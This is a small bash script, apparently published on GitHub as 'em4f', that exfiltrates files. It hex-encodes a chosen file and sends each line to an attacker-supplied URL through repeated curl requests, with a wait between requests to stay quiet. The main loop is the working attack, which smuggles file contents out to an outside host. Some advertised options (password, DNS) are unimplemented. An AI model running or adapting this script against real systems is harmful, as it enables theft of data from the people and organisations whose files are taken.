#!/bin/bash
#em4f
#ninjadru github.com/ninjadru
#gplv3

SCRIPTNAME="em4f"
VERSION="v1.1"

# option processing
print_usage() {
  echo "Usage: em4f -u http://somesite.com -i file.txt -w 10"
  echo "  $SCRIPTNAME -u STRING"
  echo "  $SCRIPTNAME -i STRING"
  echo "  $SCRIPTNAME -w INTEGER"
  echo "  $SCRIPTNAME -d "
  echo "  $SCRIPTNAME -h"
  echo "  $SCRIPTNAME -V"
}

print_version() {
  echo $SCRIPTNAME version $VERSION
  echo ""
}
print_help() {
  print_version
  echo ""
  print_usage
  echo ""
  echo "-u STRING"
  echo "   URL"
  echo "-i STRING"
  echo "   File name"
  echo "-w INTEGER"
  echo "   Wait time is seconds"
  echo "-p"
  echo "   Password for encryption"
  echo "-d"
  echo "   d is for dns"
  echo "-h"
  echo "   Print this help screen"
  echo "-V"
  echo "   Print version and license information"
  echo ""
}


# take the input and turn it to variables:
while getopts u:i:w:p:d:hV OPT
do
  case $OPT in
    u) URL="$OPTARG" ;;
    i) FILE="$OPTARG" ;;
    w) WAIT="$OPTARG" ;;
    p) PASS="$OPTARG" ;;
    d) echo "-d was traggered" >&2 ;;
    h)
      print_help
      exit $STATE_UNKNOWN
      ;;
    V)
      print_version
      exit $STATE_UNKNOWN
      ;;
   esac
done
echo "$DNS"
# pretty art
echo "_______   _____ ______   ___   ___  ________"
echo "|\  ___ \ |\   _ \  _   \|\  \ |\  \|\  _____\ "
echo "\ \  \__/|\ \  \\\__\ \  \ \  \\_\  \ \  \__/  "
echo " \ \  \_|/_\ \  \\|__| \  \ \______  \ \   __\  "
echo "  \ \  \_|\ \ \  \    \ \  \|_____|\  \ \  \_|   "
echo "   \ \_______\ \__\    \ \__\     \ \__\ \__\     "
echo "    \|_______|\|__|     \|__|      \|__|\|__| "
echo " "
echo "wake from your sleep"
echo "the drying of your tears"
echo "today we escape, we escape..."
echo " "

# hex encode
xxd -p $FILE > tmp.hex

#heavy lifting

while read line; do
  curl -s "$URL$line" 2>/dev/null > temp.html
  sleep $WAIT
done < "tmp.hex"

rm -rf tmp.hex

echo "...we hope that you choke, that you choke"
